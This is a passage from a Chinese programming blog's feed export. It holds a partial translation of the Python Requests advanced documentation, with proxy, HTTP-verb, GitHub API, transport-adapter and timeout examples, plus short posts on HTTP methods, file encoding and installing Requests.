<p>你也可以通过环境变量 <em>HTTP_PROXY</em> 和 <em>HTTPS_PROXY</em> 来配置代理。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">export</span> HTTP_PROXY=<span class="string">"http://10.10.1.10:3128"</span></span><br><span class="line">$ <span class="built_in">export</span> HTTPS_PROXY=<span class="string">"http://10.10.1.10:1080"</span></span><br><span class="line">$ python</span><br></pre></td></tr></table></figure></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">"http://example.org"</span>)</span><br></pre></td></tr></table></figure>
<p>若你的代理需要使用<strong>HTTP Basic Auth</strong>，可以使用 <strong><em><a href="http://user:password@host/" target="_blank" rel="noopener">http://user:password@host/</a> 语法</em></strong>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">"http"</span>: <span class="string">"http://user:pass@10.10.1.10:3128/"</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="合规性"><a href="#合规性" class="headerlink" title="合规性"></a>合规性</h2><hr>
<p>Requests符合所有相关的规范和RFC，这样不会为用户造成不必要的困难。但这种对规范的考虑 导致一些行为对于不熟悉相关规范的人来说看似有点奇怪。</p>
<h3 id="编码方式"><a href="#编码方式" class="headerlink" title="编码方式"></a>编码方式</h3><p>当你收到一个响应时，Requests会猜测响应的编码方式，用于在你调用 Response.text 方法时 对响应进行解码。Requests首先在HTTP头部检测是否存在指定的编码方式，如果不存在，则会使用 charade 来尝试猜测编码方式。</p>
<p>只有当HTTP头部不存在明确指定的字符集，并且 Content-Type 头部字段包含 text 值之时， Requests才不去猜测编码方式。</p>
<p>在这种情况下， RFC 2616 指定默认字符集 必须是 ISO-8859-1 。Requests遵从这一规范。如果你需要一种不同的编码方式，你可以手动设置 Response.encoding 属性，或使用原始的 Response.content 。<strong>(可结合上一篇安装使用快速上手中的 <em>响应内容</em> 学习)</strong></p>
<hr>
<h2 id="HTTP请求类型-附加例子"><a href="#HTTP请求类型-附加例子" class="headerlink" title="HTTP请求类型(附加例子)"></a>HTTP请求类型(附加例子)</h2><hr>
<p>Requests提供了几乎所有HTTP请求类型的功能：GET，OPTIONS， HEAD，POST，PUT，PATCH和DELETE。 以下内容为使用Requests中的这些请求类型以及Github API提供了<strong>详细示例</strong>。</p>
<p>我将从最常使用的请求类型GET开始。HTTP GET是一个幂等的方法，从给定的URL返回一个资源。因而， 当你试图从一个web位置获取数据之时，你应该使用这个请求类型。一个使用示例是尝试从Github上获取 关于一个特定commit的信息。假设我们想获取Requests的commit a050faf 的信息。我们可以 这样去做:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'https://api.github.com/repos/kennethreitz/requests/git/commits/a050faf084662f3a352dd1a941f2c7c9f886d4ad'</span>)</span><br></pre></td></tr></table></figure>
<p>我们应该确认Github是否正确响应。如果正确响应，我们想弄清响应内容是什么类型的。像这样去做:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> (r.status_code == requests.codes.ok):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">print</span> r.headers[<span class="string">'content-type'</span>]</span><br><span class="line">...</span><br><span class="line">application/json; charset=utf<span class="number">-8</span></span><br></pre></td></tr></table></figure>
<p>可见，GitHub返回了JSON数据，非常好，这样就可以使用 <strong>r.json</strong> 方法把这个返回的数据解析成Python对象。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>commit_data = r.json()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> commit_data.keys()</span><br><span class="line">[<span class="string">u'committer'</span>, <span class="string">u'author'</span>, <span class="string">u'url'</span>, <span class="string">u'tree'</span>, <span class="string">u'sha'</span>, <span class="string">u'parents'</span>, <span class="string">u'message'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> commit_data[<span class="string">u'committer'</span>]</span><br><span class="line">&#123;<span class="string">u'date'</span>: <span class="string">u'2012-05-10T11:10:50-07:00'</span>, <span class="string">u'email'</span>: <span class="string">u'me@kennethreitz.com'</span>, <span class="string">u'name'</span>: <span class="string">u'Kenneth Reitz'</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> commit_data[<span class="string">u'message'</span>]</span><br><span class="line">makin<span class="string">' history</span></span><br></pre></td></tr></table></figure>
<p>到目前为止，一切都非常简单。嗯，我们来研究一下GitHub的API。我们可以去看看文档， 但如果使用Requests来研究也许会更有意思一点。我们可以借助Requests的OPTIONS请求类型来看看我们刚使用过的url 支持哪些HTTP方法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>verbs = requests.options(r.url)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>verbs.status_code</span><br><span class="line"><span class="number">500</span></span><br></pre></td></tr></table></figure>
<p>额，这是怎么回事？毫无帮助嘛！原来GitHub，与许多API提供方一样，实际上并未实现OPTIONS方法。 这是一个恼人的疏忽，但没关系，那我们可以使用枯燥的文档。然而，如果GitHub正确实现了OPTIONS， 那么服务器应该在响应头中返回允许用户使用的HTTP方法，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>verbs = requests.options(<span class="string">'http://a-good-website.com/api/cats'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> verbs.headers[<span class="string">'allow'</span>]</span><br><span class="line">GET,HEAD,POST,OPTIONS</span><br></pre></td></tr></table></figure>
<p>转而去查看文档，我们看到对于提交信息，另一个允许的方法是POST，它会创建一个新的提交。 由于我们正在使用Requests代码库，我们应尽可能避免对它发送笨拙的POST。作为替代，我们来 玩玩GitHub的Issue特性。</p>
<p>本篇文档是回应<em>Issue #482</em>而添加的。鉴于该问题已经存在，我们就以它为例。先获取它。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'https://api.github.com/repos/kennethreitz/requests/issues/482'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">200</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>issue = json.loads(r.text)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> issue[<span class="string">u'title'</span>]</span><br><span class="line">Feature any http verb <span class="keyword">in</span> docs</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> issue[<span class="string">u'comments'</span>]</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>Cool，有3个评论。我们来看一下最后一个评论。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(r.url + <span class="string">u'/comments'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">200</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>comments = r.json()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> comments[<span class="number">0</span>].keys()</span><br><span class="line">[<span class="string">u'body'</span>, <span class="string">u'url'</span>, <span class="string">u'created_at'</span>, <span class="string">u'updated_at'</span>, <span class="string">u'user'</span>, <span class="string">u'id'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> comments[<span class="number">2</span>][<span class="string">u'body'</span>]</span><br><span class="line">Probably <span class="keyword">in</span> the <span class="string">"advanced"</span> section</span><br></pre></td></tr></table></figure>
<p>嗯，那看起来似乎是个愚蠢之处。我们发表个评论来告诉这个评论者他自己的愚蠢。那么，这个评论者是谁呢？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> comments[<span class="number">2</span>][<span class="string">u'user'</span>][<span class="string">u'login'</span>]</span><br><span class="line">kennethreitz</span><br></pre></td></tr></table></figure>
<p>好，我们来告诉这个叫肯尼思的家伙，这个例子应该放在快速上手指南中。根据GitHub API文档， 其方法是POST到该话题。我们来试试看。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>body = json.dumps(&#123;<span class="string">u"body"</span>: <span class="string">u"Sounds great! I'll get right on it!"</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">u"https://api.github.com/repos/kennethreitz/requests/issues/482/comments"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url=url, data=body)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">404</span></span><br></pre></td></tr></table></figure>
<p>额，这有点古怪哈。可能我们需要验证身份。那就有点纠结了，对吧？不对。Requests简化了多种身份验证形式的使用， 包括非常常见的Basic Auth。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>auth = HTTPBasicAuth(<span class="string">'fake@example.com'</span>, <span class="string">'not_a_real_password'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url=url, data=body, auth=auth)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">201</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>content = r.json()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(content[<span class="string">u'body'</span>])</span><br><span class="line">Sounds great! I<span class="string">'ll get right on it.</span></span><br></pre></td></tr></table></figure>
<p>精彩！噢，不！我原本是想说等我一会，因为我得去喂一下我的猫。如果我能够编辑这条评论那就好了！ 幸运的是，GitHub允许我们使用另一个HTTP动词，PATCH，来编辑评论。我们来试试。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(content[<span class="string">u"id"</span>])</span><br><span class="line"><span class="number">5804413</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>body = json.dumps(&#123;<span class="string">u"body"</span>: <span class="string">u"Sounds great! I'll get right on it once I feed my cat."</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">u"https://api.github.com/repos/kennethreitz/requests/issues/comments/5804413"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.patch(url=url, data=body, auth=auth)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">200</span></span><br></pre></td></tr></table></figure>
<p>非常好。现在，我们来折磨一下这个叫肯尼思的家伙，我决定要让他急得团团转，也不告诉他是我在捣蛋。 这意味着我想删除这条评论。GitHub允许我们使用完全名副其实的DELETE方法来删除评论。我们来清除该评论。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.delete(url=url, auth=auth)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">204</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.headers[<span class="string">'status'</span>]</span><br><span class="line"><span class="string">'204 No Content'</span></span><br></pre></td></tr></table></figure>
<p>很好。不见了。最后一件我想知道的事情是我已经使用了多少限额（ratelimit）。查查看，GitHub在响应头部发送这个信息， 因此不必下载整个网页，我将使用一个HEAD请求来获取响应头。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.head(url=url, auth=auth)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> r.headers</span><br><span class="line">...</span><br><span class="line"><span class="string">'x-ratelimit-remaining'</span>: <span class="string">'4995'</span></span><br><span class="line"><span class="string">'x-ratelimit-limit'</span>: <span class="string">'5000'</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>很好。是时候写个Python程序以各种刺激的方式滥用GitHub的API，还可以使用4995次呢。</p>
<hr>
<h2 id="响应头链接字段"><a href="#响应头链接字段" class="headerlink" title="响应头链接字段"></a>响应头链接字段</h2><hr>
<p>许多HTTP API都有响应头链接字段的特性，它们使得API能够更好地自我描述和自我显露。</p>
<p>GitHub在API中为 <a href="http://developer.github.com/v3/#pagination" target="_blank" rel="noopener">分页</a> 使用这些特性，例如:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'https://api.github.com/users/kennethreitz/repos?page=1&amp;per_page=10'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.head(url=url)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.headers[<span class="string">'link'</span>]</span><br><span class="line"><span class="string">'&lt;https://api.github.com/users/kennethreitz/repos?page=2&amp;per_page=10&gt;; rel="next", &lt;https://api.github.com/users/kennethreitz/repos?page=6&amp;per_page=10&gt;; rel="last"'</span></span><br></pre></td></tr></table></figure>
<p>Requests会自动解析这些响应头链接字段，并使得它们非常易于使用:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.links[<span class="string">"next"</span>]</span><br><span class="line">&#123;<span class="string">'url'</span>: <span class="string">'https://api.github.com/users/kennethreitz/repos?page=2&amp;per_page=10'</span>, <span class="string">'rel'</span>: <span class="string">'next'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.links[<span class="string">"last"</span>]</span><br><span class="line">&#123;<span class="string">'url'</span>: <span class="string">'https://api.github.com/users/kennethreitz/repos?page=7&amp;per_page=10'</span>, <span class="string">'rel'</span>: <span class="string">'last'</span>&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="Transport-Adapters"><a href="#Transport-Adapters" class="headerlink" title="Transport Adapters"></a>Transport Adapters</h2><hr>
<p>As of v1.0.0, Requests has moved to a modular internal design. Part of the reason this was done was to implement Transport Adapters, originally <a href="http://www.kennethreitz.org/essays/the-future-of-python-http" target="_blank" rel="noopener">described here</a>. Transport Adapters provide a mechanism to define interaction methods for an HTTP service. In particular, they allow you to apply per-service configuration.</p>
<p>Requests ships with a single Transport Adapter, the HTTPAdapter. This adapter provides the default Requests interaction with HTTP and HTTPS using the powerful <a href="https://github.com/shazow/urllib3" target="_blank" rel="noopener">urllib3</a> library. Whenever a Requests <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Session" target="_blank" rel="noopener">Session</a> is initialized, one of these is attached to the <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Session" target="_blank" rel="noopener">Session</a> object for HTTP, and one for HTTPS.</p>
<p>Requests enables users to create and use their own Transport Adapters that provide specific functionality. Once created, a Transport Adapter can be mounted to a Session object, along with an indication of which web services it should apply to.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = requests.Session()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.mount(<span class="string">'http://www.github.com'</span>, MyAdapter())</span><br></pre></td></tr></table></figure>
<p>The mount call registers a specific instance of a Transport Adapter to a prefix. Once mounted, any HTTP request made using that session whose URL starts with the given prefix will use the given Transport Adapter.</p>
<p>Many of the details of implementing a Transport Adapter are beyond the scope of this documentation, but take a look at the next example for a simple SSL use- case. For more than that, you might look at subclassing <em>requests.adapters.BaseAdapter</em>.</p>
<h3 id="Example-Specific-SSL-Version"><a href="#Example-Specific-SSL-Version" class="headerlink" title="Example: Specific SSL Version"></a>Example: Specific SSL Version</h3><p>The Requests team has made a specific choice to use whatever SSL version is default in the underlying library (<a href="https://github.com/shazow/urllib3" target="_blank" rel="noopener">urllib3</a>). Normally this is fine, but from time to time, you might find yourself needing to connect to a service-endpoint that uses a version that isn’t compatible with the default.</p>
<p>You can use Transport Adapters for this by taking most of the existing implementation of HTTPAdapter, and adding a parameter <em>ssl_version</em> that gets passed-through to <em>urllib3</em>. We’ll make a TA that instructs the library to use SSLv3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> requests.adapters <span class="keyword">import</span> HTTPAdapter</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.poolmanager <span class="keyword">import</span> PoolManager</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ssl3HttpAdapter</span><span class="params">(HTTPAdapter)</span>:</span></span><br><span class="line">    <span class="string">""""Transport adapter" that allows us to use SSLv3."""</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init_poolmanager</span><span class="params">(self, connections, maxsize, block=False)</span>:</span></span><br><span class="line">        self.poolmanager = PoolManager(num_pools=connections,</span><br><span class="line">                                       maxsize=maxsize,</span><br><span class="line">                                       block=block,</span><br><span class="line">                                       ssl_version=ssl.PROTOCOL_SSLv3)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="Blocking-Or-Non-Blocking"><a href="#Blocking-Or-Non-Blocking" class="headerlink" title="Blocking Or Non-Blocking?"></a>Blocking Or Non-Blocking?</h2><hr>
<p>With the default Transport Adapter in place, Requests does not provide any kind of non-blocking IO. The <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.content" target="_blank" rel="noopener"><strong>Response.content</strong></a> property will block until the entire response has been downloaded. If you require more granularity, the streaming features of the library (see <a href="http://cn.python-requests.org/zh_CN/latest/user/advanced.html#streaming-requests" target="_blank" rel="noopener">流式请求</a>) allow you to retrieve smaller quantities of the response at a time. However, these calls will still block.</p>
<p>If you are concerned about the use of blocking IO, there are lots of projects out there that combine Requests with one of Python’s asynchronicity frameworks. Two excellent examples are <a href="https://github.com/kennethreitz/grequests" target="_blank" rel="noopener">grequests</a> and <a href="https://github.com/ross/requests-futures" target="_blank" rel="noopener">requests-futures</a>.</p>
<hr>
<h2 id="Timeouts"><a href="#Timeouts" class="headerlink" title="Timeouts"></a>Timeouts</h2><hr>
<p>Most requests to external servers should have a timeout attached, in case the server is not responding in a timely manner. Without a timeout, your code may hang for minutes or more.</p>
<p>The connect timeout is the number of seconds Requests will wait for your client to establish a connection to a remote machine (corresponding to the <a href="http://linux.die.net/man/2/connect" target="_blank" rel="noopener">connect()</a>) call on the socket. It’s a good practice to set connect timeouts to slightly larger than a multiple of 3, which is the default <a href="http://www.hjp.at/doc/rfc/rfc2988.txt" target="_blank" rel="noopener">TCP packet retransmission window</a>.</p>
<p>Once your client has connected to the server and sent the HTTP request, the read timeout is the number of seconds the client will wait for the server to send a response. (Specifically, it’s the number of seconds that the client will wait between bytes sent from the server. In 99.9% of cases, this is the time before the server sends the first byte).</p>
<p>If you specify a single value for the timeout, like this:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r = requests.get(<span class="string">'https://github.com'</span>, timeout=<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
<p>The timeout value will be applied to both the connect and the read timeouts. Specify a tuple if you would like to set the values separately:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r = requests.get(<span class="string">'https://github.com'</span>, timeout=(<span class="number">3.05</span>, <span class="number">27</span>))</span><br></pre></td></tr></table></figure>
<p>If the remote server is very slow, you can tell Requests to wait forever for a response, by passing None as a timeout value and then retrieving a cup of coffee.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r = requests.get(<span class="string">'https://github.com'</span>, timeout=<span class="keyword">None</span>)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="CA-Certificates"><a href="#CA-Certificates" class="headerlink" title="CA Certificates"></a>CA Certificates</h2><hr>
<p>By default Requests bundles a set of root CAs that it trusts, sourced from the <a href="https://hg.mozilla.org/mozilla-central/raw-file/tip/security/nss/lib/ckfw/builtins/certdata.txt" target="_blank" rel="noopener">Mozilla trust store</a>. However, these are only updated once for each Requests version. This means that if you pin a Requests version your certificates can become extremely out of date.</p>
<p>From Requests version 2.4.0 onwards, Requests will attempt to use certificates from <a href="http://certifi.io/" target="_blank" rel="noopener">certifi</a> if it is present on the system. This allows for users to update their trusted certificates without having to change the code that runs on their system.</p>
<p>For the sake of security we recommend upgrading certifi frequently!</p>
<hr>
<blockquote>
<p><strong>说明：前面有些官方文档没翻译到的，我自己翻译了，后一部分，时间太晚了，是在没精力了，以后有时间再翻译，可能我翻译的有些语句不通顺，但是还是能大概表达出意思的，如果你对比了官方文档，觉得你可以翻译得更好，可以私信或留言我哦</strong></p>
</blockquote>
<blockquote>
<p><strong>想喷我的人也省省吧，的确，这篇文章和之前的一篇Requests安装使用都是我从官网移植过来的，但是我花时间翻译了一部分，排版也废了番功夫，使用MarkDown写成，需要源md文档也可以找我索要，本文随意传播</strong></p>
</blockquote>
<blockquote>
<hr>
</blockquote>
<blockquote>
<p><strong>我是Akkuman，同道人可以和我一起交流哦，私信或留言均可,我的博客hacktech.cn | 53xiaoshuo.com</strong></p>
</blockquote>
<blockquote>
<hr>
</blockquote>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP协议请求类型介绍</title>
    <url>/2016/06/10/HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E7%B1%BB%E5%9E%8B%E4%BB%8B%E7%BB%8D.html</url>
    <content><![CDATA[<hr>
<p><strong>HTTP协议中共定义了八种方法或者叫“动作”来表明对Request-URI指定的资源的不同操作方式，具体介绍如下：</strong></p>
<hr>
<h1 id="OPTIONS："><a href="#OPTIONS：" class="headerlink" title="OPTIONS："></a>OPTIONS：</h1><p>返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送’*’的请求来测试服务器的功能性。</p>
<h1 id="HEAD："><a href="#HEAD：" class="headerlink" title="HEAD："></a>HEAD：</h1><p>向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。</p>
<h1 id="GET："><a href="#GET：" class="headerlink" title="GET："></a>GET：</h1><p>向特定的资源发出请求。<br><a id="more"></a></p>
<h1 id="POST："><a href="#POST：" class="headerlink" title="POST："></a>POST：</h1><p>向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的创建和/或已有资源的修改。 </p>
<h1 id="PUT："><a href="#PUT：" class="headerlink" title="PUT："></a>PUT：</h1><p>向指定资源位置上传其最新内容。 </p>
<h1 id="DELETE："><a href="#DELETE：" class="headerlink" title="DELETE："></a>DELETE：</h1><p>请求服务器删除Request-URI所标识的资源。 </p>
<h1 id="TRACE："><a href="#TRACE：" class="headerlink" title="TRACE："></a>TRACE：</h1><p>回显服务器收到的请求，主要用于测试或诊断。 </p>
<h1 id="CONNECT："><a href="#CONNECT：" class="headerlink" title="CONNECT："></a>CONNECT：</h1><p>HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。</p>
<hr>
<p><strong>虽然HTTP的请求方式有8种，但是我们在实际应用中常用的也就是get和post，其他请求方式也都可以通过这两种方式间接的来实现。</strong></p>
<hr>
<p>转载自：<a href="http://www.xuebuyuan.com/1586750.html" target="_blank" rel="noopener">http://www.xuebuyuan.com/1586750.html</a></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>Python中的open和codecs.open</title>
    <url>/2016/06/10/Python%E4%B8%AD%E7%9A%84open%E5%92%8Ccodecs-open.html</url>
    <content><![CDATA[<p>最近老被编码困扰，多次折腾之后，感觉python的编解码做得挺好的，只要了解<strong>下边的流程，一般都能解决</strong></p>
<p><strong>input文件(gbk, utf-8…)   —-decode—–&gt;   unicode  ——-encode——&gt; output文件(gbk, utf-8…)</strong><br>很多文本挖掘的package是在unicode上边做事的，比如nltk. 所以开始读入文件后要decode为unicode格式，可以通过下边两步：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f=open(<span class="string">'XXXXX'</span>, <span class="string">'r'</span>)</span><br><span class="line">content=f.read().decode(<span class="string">'utf-8'</span>)</span><br></pre></td></tr></table></figure></p>
<p>更好的方法是使用codecs.open读入时直接解码：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f=codecs.open(XXX, encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">content=f.read()</span><br></pre></td></tr></table></figure></p>
<p>转自: <a href="http://f.dataguru.cn/thread-237116-1-1.html" target="_blank" rel="noopener">http://f.dataguru.cn/thread-237116-1-1.html</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python之Requests的安装与基本使用</title>
    <url>/2016/06/09/Python%E4%B9%8BRequests%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8.html</url>
    <content><![CDATA[<hr>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><hr>
<p>使用 pip 安装Requests非常简单<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure></p>
<p>或者使用 easy_install 安装<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">easy_install requests</span><br></pre></td></tr></table></figure></p>
<hr>
<h1 id="获得源码"><a href="#获得源码" class="headerlink" title="获得源码"></a>获得源码</h1><hr>
<p>Requests 一直在Github上被积极的开发着</p>
<p>你可以克隆公共版本库:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://github.com/kennethreitz/requests.git</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>下载 源码:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -OL https://github.com/kennethreitz/requests/tarball/master</span><br></pre></td></tr></table></figure>
<p>或者下载 zipball:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -OL https://github.com/kennethreitz/requests/zipball/master</span><br></pre></td></tr></table></figure>
<p>一旦你获得了复本，你就可以轻松的将它嵌入到你的python包里或者安装到你的site-packages:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h1><hr>
<hr>
<h2 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h2><hr>
<p>使用Requests发送网络请求非常简单。</p>
<p>一开始要导入Requests模块:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</span><br></pre></td></tr></table></figure>
<p>然后，尝试获取某个网页。本例子中，我们来获取Github的公共时间线</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'https://github.com/timeline.json'</span>)</span><br></pre></td></tr></table></figure>
<p>现在，我们有一个名为 r 的 Response 对象。可以从这个对象中获取所有我们想要的信息。</p>
<p>Requests简便的API意味着所有HTTP请求类型都是显而易见的。例如，你可以这样发送一个HTTP POST请求:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(<span class="string">"http://httpbin.org/post"</span>)</span><br></pre></td></tr></table></figure>
<p>漂亮，对吧？那么其他HTTP请求类型：PUT， DELETE， HEAD以及OPTIONS又是如何的呢？都是一样的简单:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.put(<span class="string">"http://httpbin.org/put"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.delete(<span class="string">"http://httpbin.org/delete"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.head(<span class="string">"http://httpbin.org/get"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.options(<span class="string">"http://httpbin.org/get"</span>)</span><br></pre></td></tr></table></figure>
<p>都很不错吧，但这也仅是Requests的冰山一角呢。</p>
<hr>
<h2 id="为URL传递参数"><a href="#为URL传递参数" class="headerlink" title="为URL传递参数"></a>为URL传递参数</h2><hr>
<p>你也许经常想为URL的查询字符串(query string)传递某种数据。如果你是手工构建URL，那么数据会以键/值 对的形式置于URL中，跟在一个问号的后面。例如， httpbin.org/get?key=val 。 Requests允许你使用 params 关键字参数，以一个字典来提供这些参数。举例来说，如果你想传递 key1=value1 和 key2=value2 到 httpbin.org/get ，那么你可以使用如下代码:</p>
